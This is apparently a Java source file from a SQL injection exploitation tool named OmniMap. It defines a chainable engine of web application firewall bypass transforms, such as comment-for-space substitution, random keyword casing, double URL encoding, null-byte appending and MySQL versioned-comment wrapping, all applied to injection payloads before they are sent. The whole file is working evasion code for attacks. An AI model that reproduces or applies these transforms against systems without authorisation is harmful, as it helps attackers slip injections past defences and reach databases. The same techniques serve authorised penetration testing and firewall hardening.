package com.omnistrike.modules.exploit.omnimap.tamper;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.function.Function;

/**
 * WAF bypass payload transforms for OmniMap.
 * Each tamper is a chainable string transformation applied to SQL payloads
 * before injection. Multiple tampers can be stacked in order.
 */
public class TamperEngine {

    private static final Random RANDOM = new Random();

    /** All available tamper transforms, keyed by name */
    private static final Map<String, Function<String, String>> TAMPERS = new LinkedHashMap<>();

    static {
        TAMPERS.put("space2comment", TamperEngine::space2comment);
        TAMPERS.put("space2plus", TamperEngine::space2plus);
        TAMPERS.put("randomCase", TamperEngine::randomCase);
        TAMPERS.put("between", TamperEngine::between);
        TAMPERS.put("charencode", TamperEngine::charencode);
        TAMPERS.put("doubleEncode", TamperEngine::doubleEncode);
        TAMPERS.put("appendNullByte", TamperEngine::appendNullByte);
        TAMPERS.put("commentBeforeParen", TamperEngine::commentBeforeParen);
        TAMPERS.put("equalToLike", TamperEngine::equalToLike);
        TAMPERS.put("space2dash", TamperEngine::space2dash);
        TAMPERS.put("space2hash", TamperEngine::space2hash);
        TAMPERS.put("versionedKeywords", TamperEngine::versionedKeywords);
    }

    /**
     * Apply selected tamper transforms to a payload in order.
     * Returns the transformed payload.
     */
    public static String apply(String payload, List<String> selectedTampers) {
        if (payload == null || selectedTampers == null || selectedTampers.isEmpty()) {
            return payload;
        }

        String result = payload;
        for (String tamperName : selectedTampers) {
            Function<String, String> tamper = TAMPERS.get(tamperName);
            if (tamper != null) {
                result = tamper.apply(result);
            }
        }
        return result;
    }

    /** Get all available tamper names */
    public static String[] getAvailableTampers() {
        return TAMPERS.keySet().toArray(new String[0]);
    }

    /** Get description for a tamper */
    public static String getDescription(String tamperName) {
        return switch (tamperName) {
            case "space2comment" -> "Replace spaces with inline comments /**/";
            case "space2plus" -> "Replace spaces with + (URL-encoded space)";
            case "randomCase" -> "Randomize case of SQL keywords (SeLeCt)";
            case "between" -> "Replace > with NOT BETWEEN 0 AND";
            case "charencode" -> "URL-encode all characters";
            case "doubleEncode" -> "Double URL-encode the payload";
            case "appendNullByte" -> "Append %00 null byte";
            case "commentBeforeParen" -> "Insert /**/ before parentheses";
            case "equalToLike" -> "Replace = with LIKE";
            case "space2dash" -> "Replace spaces with --\\n (dash-dash-newline)";
            case "space2hash" -> "Replace spaces with #\\n (MySQL hash comment)";
            case "versionedKeywords" -> "Wrap MySQL keywords in versioned comments /*!50000SELECT*/";
            default -> tamperName;
        };
    }

    // ===== Tamper Implementations =====

    /** Replace spaces with inline SQL comments */
    static String space2comment(String payload) {
        return payload.replace(" ", "/**/");
    }

    /** Replace spaces with + (URL-encoded space alternative) */
    static String space2plus(String payload) {
        return payload.replace(" ", "+");
    }

    /** Randomize case of SQL keywords */
    static String randomCase(String payload) {
        StringBuilder sb = new StringBuilder(payload.length());
        for (char c : payload.toCharArray()) {
            if (Character.isLetter(c)) {
                sb.append(RANDOM.nextBoolean() ? Character.toUpperCase(c) : Character.toLowerCase(c));
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    /** Replace > operator with NOT BETWEEN 0 AND */
    static String between(String payload) {
        return payload.replace(">", " NOT BETWEEN 0 AND ");
    }

    /** URL-encode all characters */
    static String charencode(String payload) {
        StringBuilder sb = new StringBuilder();
        for (byte b : payload.getBytes(StandardCharsets.UTF_8)) {
            sb.append(String.format("%%%02X", b & 0xFF));
        }
        return sb.toString();
    }

    /** Double URL-encode */
    static String doubleEncode(String payload) {
        String first = URLEncoder.encode(payload, StandardCharsets.UTF_8);
        return URLEncoder.encode(first, StandardCharsets.UTF_8);
    }

    /** Append null byte */
    static String appendNullByte(String payload) {
        return payload + "%00";
    }

    /** Insert inline comment before parentheses */
    static String commentBeforeParen(String payload) {
        return payload.replace("(", "/**/(");
    }

    /** Replace = with LIKE */
    static String equalToLike(String payload) {
        return payload.replace("=", " LIKE ");
    }

    /** Replace spaces with --\n (dash comment + newline) */
    static String space2dash(String payload) {
        return payload.replace(" ", "--%0A");
    }

    /** Replace spaces with #\n (MySQL hash comment + newline) */
    static String space2hash(String payload) {
        return payload.replace(" ", "%23%0A");
    }

    /** Wrap MySQL keywords in versioned comments */
    static String versionedKeywords(String payload) {
        String[] keywords = {"SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
                "INSERT", "UPDATE", "DELETE", "DROP", "CONCAT", "GROUP", "HAVING", "LIMIT",
                "OFFSET", "JOIN", "NULL", "CASE", "WHEN", "THEN", "ELSE", "END", "IF",
                "SLEEP", "BENCHMARK", "SUBSTR", "SUBSTRING", "ASCII", "CHAR", "LENGTH", "MID"};

        String result = payload;
        for (String kw : keywords) {
            // Case-insensitive replace with versioned comment
            result = result.replaceAll("(?i)\\b" + kw + "\\b", "/*!50000" + kw + "*/");
        }
        return result;
    }
}
